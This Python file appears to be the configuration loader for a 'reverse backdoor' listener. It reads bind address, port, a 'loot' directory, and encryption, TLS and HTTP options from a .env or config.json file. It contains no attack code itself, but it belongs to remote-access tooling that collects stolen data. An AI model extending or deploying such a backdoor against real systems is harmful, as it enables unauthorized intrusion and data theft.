import json
import os


def _load_dotenv():
    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.env')
    if not os.path.exists(env_path):
        return {}
    values = {}
    with open(env_path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            key, _, val = line.partition('=')
            key, val = key.strip(), val.strip()
            if key and val:
                values[key] = val
    return values


def load_config():
    env = _load_dotenv()

    config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.json')
    defaults = {}

    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        defaults.update(config)
    except Exception:
        pass

    bind_host = env.get('REVERSE_BACKDOOR_BIND_HOST') or defaults.get('bind_host', '0.0.0.0')
    bind_port = int(env.get('REVERSE_BACKDOOR_BIND_PORT') or defaults.get('bind_port', 5555))
    loot_dir = env.get('REVERSE_BACKDOOR_LOOT_DIR') or defaults.get('loot_dir', './loot')
    encryption = env.get('REVERSE_BACKDOOR_ENCRYPTION', '').lower() == 'true'
    tls = env.get('REVERSE_BACKDOOR_TLS', '').lower() == 'true'
    http_mode = env.get('REVERSE_BACKDOOR_HTTP', '').lower() == 'true'

    return {
        'bind_host': bind_host,
        'bind_port': bind_port,
        'loot_dir': loot_dir,
        'encryption': encryption,
        'tls': tls,
        'http_mode': http_mode,
    }
